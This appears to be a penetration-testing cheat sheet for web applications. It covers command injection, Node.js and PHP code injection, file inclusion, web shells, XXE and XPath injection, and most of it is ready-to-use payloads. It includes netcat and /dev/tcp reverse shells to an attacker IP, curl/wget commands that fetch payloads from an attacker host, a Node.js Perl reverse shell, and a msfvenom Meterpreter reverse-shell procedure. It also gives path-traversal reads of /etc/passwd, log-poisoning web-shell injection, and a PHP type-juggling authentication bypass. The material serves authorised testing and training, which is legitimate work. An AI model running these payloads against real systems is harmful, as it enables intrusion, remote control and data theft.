---
title: Injection, RFI/LFI, XML
category: Web Application
order: 4
---

> **Test for Command Injection**

Prefixs before attack payload (command seperator): | <code> ``, &, &&, ||,  <, >, ;, $() </code>
Test Visable: | <code> ; ls /ect/passwd or /ect/hosts <br>test`pwd` <br> test$(pwd) <br> test; pwd <br> test | pwd <br> test && pwd </code>
Test Blind Ping: | <code> ; ping y.o.ur.ip <br> <br> On your attack system: <br> sudo tcpdump -n host [victimIP] and icmp </code>
Test Blind DNS: | <code> nslookup (you need a public facing system to see nslookup)</code>
Test Blind Sleep: | <code> address=127.0.0.1 && sleep 10 </code>

**Comix**
{% highlight bash %}
commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument"

python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"
{% endhighlight %}

> **Command Injection from Code Review**

**Java**

{% highlight java %}
Runtime.exec()
getParameter
getRuntime.exec()
ProcessBuilder.start()
setAttribute putValue getValue
java.net.Socket java.io.fileInputStream java.io.FileReader
{% endhighlight %}

**C/C++**

{% highlight C %}
system
exec
ShellExecute
execlp
{% endhighlight %}

**Python** 

{% highlight python %}
exec
eval
os.system
os.popen
subprocess.popen
subprocess.call
{% endhighlight %}


**PHP**

{% highlight PHP %}
system
shell_exec
exec
proc_open
eval
passthru
proc_open
expect_open
ssh2_exec
popen
{% endhighlight %}

**Perl**

{% highlight Perl %}
CGI.pm
referer
cookie
ReadParse
{% endhighlight %}

**ASP.NET**

{% highlight bash %}
HttpRequest.Params
HttpRequest.Url
HttpRequest.Item
{% endhighlight %}


> **Exploit Command Injection**

{% highlight bash %}
#Attacker Machine
tcpdump -n host <webserver IP> and ICMP
nc -l [port]
#Victim
test; ping -c 4 <yourAttackerIP>; echo hello 
test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello

#Alternative to NC for non-debian based distrobutions
/bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 

#Alternative without spaces
http://victim/file?arg=$(CMD=$'curl\x20http://[AttackerIP]/shell.php\x20--output\x20/tmp/Notshell.php';$CMD)
http://victim/file?arg=$({wget,http://[AttackerIP]:[AttackerPort]/t,-O,/tmp/t})
http://victim/file?arg=$({chmod,+x,/tmp/t})
{% endhighlight %}

> **NodeJS Code Injection**

Look for javascript errors in output with sqli or xss test strings:

"SyntaxError: Unexpected token function"

"SyntaxError: Unexpected end of input"

Test for injection:

{% highlight javascript %}
0; res.json({"foo": "bar"});
//look for json foo back

res.end('test') 
//res.end method terminates backend processing and sends contents to user
{% endhighlight %}

Read Files and Directories:

{% highlight javascript %}
 //directories
 res.end(require('fs').readdirSync('.').toString())

//files
0; var fs = require('fs'); fs.readFile('/etc/passwd', function(err, data) {
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.write(data);
    res.end();
  });
  
  //files
  res.end(require('fs'.readFileSync('/etc/passwd').toString())
 
{% endhighlight %}

Test remote connectivity:

{% highlight javascript %}
0; var exec = require('child_process').exec; var child = exec('wget -O /dev/null -q 10.42.76.3',function (error, stdout, stderr) { });
{% endhighlight %}

Remote Shell:

{% highlight javascript %}
0; var exec = require('child_process').exec; var child = exec("perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.42.76.3:4444\"); STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",function (error, stdout, stderr) { });
{% endhighlight %}

> **PHP Code Injection**

{% highlight bash %}
#example string
'.sleep(hexdec(dechex(20))).'

#example request
/index.php?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00Admin'.sleep(hexdec(dechex(20))).'
{% endhighlight %}

> **PHP Juggling Authentication**

If the authentication code looks like this:

{% highlight php %}
<?php
if (strcmp($_POST['password'], 'sekret') == 0) {
    echo "Welcome, authorized user!\n";
} else {
    echo "Go away, imposter.\n";
}
?>
{% endhighlight %}

Then you could do something like this:

{% highlight php %}
curl -d password[]=wrong http://andersk.scripts.mit.edu/strcmp.php
Welcome, authorized user!
{% endhighlight %}


> **Java Struts OGNL Injection**

Look for 3 in the result:

{% highlight bash %}
{% raw %}
http://localhost:8080/example/HelloWorld.action?message=${%{1+2}}
{% endraw %}
{% endhighlight %}

> **File Inclusion**

**Discovery**

* Find Limitations: Is there code execution or are you seeing the source code? Are you able to read files outside of webroot? 
* Determine if RFI is possible using Loopback (e.g., http://blog.site.org/blog.php?page=http://127.0.0.1/blog.php).  
* If RFI is possible using loopback only try SMB/CIFS/nonstandard port or for PHP data:// or php:// (see below).

**Common Examples in Different Languages**

{% highlight php %}
//PHP
//Dynamic code execution
require() 
include()
<?PHP include ( $_GET["page"] ); ?>
//blog.php?page=blog1

//Defenses: Prepending
<?php include ( 'posts/' . $_GET["page"] ); ?>
//a series of "../" can be prepeneded as a directory traversal

//Defenses: Appending
<?php included( $_GET["page"] . '.html'); ?>
//Old PHP %00 will ingore everything after the null
//New PHP a "?" is possibly similar to "%00"  and will ignore everything  after the question mark (query parameters)

//Defense: Using Data - Sends raw data using the URL 
(e.g., http://blog.site.org/blog.php?page=data://text/plain;base64,SSBsb3ZlIFBIUCE=)
                                                                                                   
//Defense: Using Input - traeats POST data as a file.  Create php_input_exploit.html, open it with firefox and submit the form
<form action="http://blog.site.org/fileview.php?loc=php://input" method="post" enctype="text/plain">
<input type="text" name="exploit" value="<?php phpinfo(); ?>" />
  
//System Commands:
<?php passthru(".."); ?> 
<?php system(".."); ?>

//Write files to /var/www/
fopen and fwrite
{% endhighlight %}

{% highlight C# %}
//ASP(.net)
//Dynamic with no code execution
Response.WriteFile()

//Dynamic code execution with web root access only.
Server.Execute()

//Defenses: Appending:
// ASP a "?" is possibly similar to "%00"  and will ignore everything after the question mark (query parameters)

//RFI .net on windowsusing SMB/CIFS
\\attacker\mal\malicious.txt

//System Commands
<% Shell("...") %>

//Write Files to C;\\inetpub\wwwroot
FileSystemObject
{% endhighlight %}

{% highlight java %}
//JSP
//Dynamic code execution with web root access only.
<jsp:include page="" />

//Defenses: Appending
//JSP a "?" is similar to "%00"  and will ignore everything after the question mark (query parameters)

//RFI java on windowsusing SMB/CIFS
\\attacker\mal\malicious.txt
{% endhighlight %}

**Linux Test Strings:**

{% highlight bash %}
http://website/?p=file%3a%2f%2f%2fetc%2fpasswd

/ect/passwd

 ../../../../../../../../../../../../../../ect/passwd 
 
  ../../../../../../../../../../../../../../ect/passwd%00
{% endhighlight %}

**Windows Test Strings:**

{% highlight bash %}
../../../winnt/system32.cmd.exe+/c+dir (not frequent)

%WINDIR%\win.ini 

C:\windows\win.ini

%SYSTEMDRIVE%\boot.ini //note only older versions of windows 
{% endhighlight %}

**Auto-Extension (.php) Bypass (PHP version < 5.3):**

* NULL "%00"

{% highlight bash %}
/index.php?system=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00Admin
{% endhighlight %}

>**Shell from RFI and LFI**

**Test Tool - fimap**
{% highlight bash %}
fimap -u 'http://website/?p=file.html'
{% endhighlight %}

**Using ZAP to Fuzz the URL:**
1. Right click on request that looks injectable -> fuzz using
[JHADDIX_LFI](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/lfi/JHADDIX_LFI.txt)


**What to go after - Linux:**
* /etc/passwd
* [Linux pwnwiki](http://pwnwiki.io/#!presence/linux/blind.md)

**What to go after - Windows:**
* Old IIS: HTTP://vulnsite/scripts/../../../winnt/system32/CMD.exe+/C+dir (may need to encode the slashes)
* http://vulnsite/index.php?templ=../include/siteconfig.inc (or just templ=red)
* /global.asax
* \docume~1\fprefect\mydocu~1
* \windows\system32\cmd.exe
* [Windows pwnwiki](http://pwnwiki.io/#!presence/windows/blind.md)

**File Locations -Debian w/ Apache:**
* /var/www/html
* /home/username/public_html
* /use/lib/cgi-bin

**Grab PHP files and Binary Data**

{% highlight bash %}
curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=[resource]" | base64 -d
<br>
Examples:<br>
/etc/php/7.0/apache2/php.ini
index.php
{% endhighlight %}

**RFI Shell 1:**
1. VI a webshell (https://binaryexile.github.io/6%20-%20Web%20Application/Vulnerabilities/)
2. python -m SimpleHTTPServer 8080
3. Set up netcat listener (if needed based on webshell)
3. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)

**RFI Meterpreter Shell:**
1. Create Payload: msfvenom LPORT=1234 LHOST=192.168.1.8 -p php/meterpreter_reverse_tcp -f raw > ~/met_rev_tcp_1234.txt
2. Wrap it: add <?php ?> to the payload
3.  Set up handler: 
* use exploit/multi/handler
* set payload php/meterpreter_reverse/tcp
* set lhost 192.168.1.8
* set lport 1234
exploit
4.  python -m SimpleHTTPServer 8080
5. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)

**LFI Shell:**

Must have the following:
* The application or server writes to a file
* The contents of the file can be controlled
* The web server has permission to read the file

Examples:
* A blog, wiki, or CMS that creates entries as files
* An e-mail server with e-mails as files
* An FTP server with anonymous upload
* The application supports file uploads

Possible Methods:
* Application specific files (e.g., file-based blog)
* Server Specific Files (e-mail server, FTP, and so on)
* File upload (even when not in web root)
* PHP session files
* Log files (applicaiton, Apache, SSH, or other)

Linux:

* /proc/self/environ - Environment variables (e.g., user agent)

{% highlight bash %}
#Change User-Agent: <?php phpinfo(); ?>
#Brute force a file number
GET /fileview.php?loc=/proc/self/environ
{% endhighlight %}

* /proc/self/fd/# - Currently open file streams (number over 2)

{% highlight bash %}
#Upload a file
#Brute force a file number
GET /fileview.php?loc=/proc/self/fd/$number$
{% endhighlight %}

* /proc/self/cmdline - Command line invocation

Linux PHP Session:

File named sess_[session id]
* /tmp
* /var/lib/php5
* /var/lib/php/session
* ../temp


Windows PHP Session:

* PHP saves session data in C:\Windows\Temp

Exploitiong Session Files:
{% highlight bash %}
# Find Session ID (e.g., PHPSESSID)
# Navigate to http://blog.name.org/fileview.php?loc=/var/lib/php5/sess_[sessionID] (or similar URL)
# Find an controllable session field and update it with PHP code
# Navigate to http://blog.name.org/fileview.php?loc=/var/lib/php5/sess_[sessionID] (or similar URL)
{% endhighlight %}


Linux Server Logs:

* Web server log: /var/log/httpd/access_log (URI and User Agent)
* System Authentication Logs: /var/log/auth.log (SSH, FTP,...)
* Read vendor documentation for framework

{% highlight bash %}
#From logs
nc -nv 192.168.1.2 80
<?php echo shell_exec($_GET['cmd']);?>
Navigate to http://192.168.1.2/cmd=ipconfig&LANG=../../../../../../../../xampp/apache/logs/access_log%00

#Look for file uploads and determin directory
#Attempt to upload a web shell
Navigate to that location using LFI.

{% endhighlight %}

* [LFI Shell 1](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)
* [LFI Shell 2](https://highon.coffee/blog/lfi-cheat-sheet/)


**PHPINFO File Upload for LFI**
Create a script that does (e.g., phpinfoLFI.py):
1. Create an HTML file onthe attackers box
{% highlight HTML %}
<html><body>
<form enctype="multipart/form=data" action="phpinfo.php" method="POST">
  <input name="upfile" type="file" />
  <input type="submit" /> 
  </form>
  </body></html>
{% endhighlight %}

2. Look at the return page for the random file name and location [tmp_name] => /tmp/phpL9A0b

3. Use LFI to read the file blog.site.org/fileview.php?loc=/tmp/phpL9A0b

> **Web Shells**

Kali: 

PHP | <code> /usr/share/webshells/php/ </code>
PERL | <code> /usr/share/webshells/perl/ </code>
Cold Fusion | <code> /usr/share/webshells/cfm/ </code>
ASP | <code> /usr/share/webshells/asp/ </code>
ASPX | <code> /usr/share/webshells/aspx/ </code>
JSP | <code> /usr/share/webshells/jsp/jsp-reverse.jsp </code>

Online:

* [PHP and Perl](http://pentestmonkey.net/category/tools/web-shells)
* [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

> **XXE**

{% highlight XML %}

Example 1:
<!DOCTYPE interestingsites[
	<!ENTITY ISC "isc.sans.edu">
	<!ENTITY SPL "portal.sans.org">
	<!ENTITY GO "www.google.com">
]>

&SPL; is replace upon parsing

<interestingsites>
	<title>ISC</title>
	<host>&SPL;</host>
</interestingsites>

Example 2:
<?xml version="1.0"?>

<!DOCTYPE root [
<!ENTITY c SYSTEM "file://view_order.php">
] >

<order>
	<item>
		<name>&c;</name>
		<amount>1</amount>
	</item>
</order>


{% endhighlight %}

* [SANS XXE](https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities)
* [OWASP XXE](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
* [OWASP XML Cheat Sheet](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet)
* [Youtube XXE](https://www.youtube.com/watch?v=DJaX4HN2gwQ)
* [Microsoft XML Entity](https://msdn.microsoft.com/en-us/library/ms256483(v=vs.110).aspx)
* [w3schools XML DTD](https://www.w3schools.com/xml/xml_dtd.asp)

> **LDAP Injection**

* [SANS](https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap)
* [OWASP](https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006))


> **PHP Autoload and Object Injection**
* [PHP Autoload](https://hakre.wordpress.com/2013/02/10/php-autoload-invalid-classname-injection/)
* [PHP Autoload](https://prezi.com/5hif_vurb56p/php-object-injection-revisited/)


> **XPATH**

{% highlight XML %}
Query Examples
///Member
/Grops/Security/Member/[Name="J*"]
///@type="0"

Test Characters
'
"
//
' or '1'='1
{% endhighlight %}

> **Useful Resources**

* [Shells](http://laudanum.sourceforge.net)
* [MongoDB](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [websec](https://websec.ca/kb/sql_injection)
* [PentestMonkey](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
* [SQLInjection Wiki](http://www.sqlinjectionwiki.com)
* [Access Injection Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
* [Command Injection](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [Fuzzing List](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing)
* [LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)
* [LFI Shell 1](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)
* [LFI Shell 2](https://highon.coffee/blog/lfi-cheat-sheet/)
* [CGI-Bin](https://www.hellboundhackers.org/articles/read-article.php?article_id=7)
* [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors)
* [Informix, MSSQL, Oracle, MySQL, Postgres, DB2, Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)


> **Useful Tools**

* [SQLMap](http://sqlmap.org)
* [Commix](http://www.kitploit.com/2015/04/commix-automated-all-in-one-os-command.html)



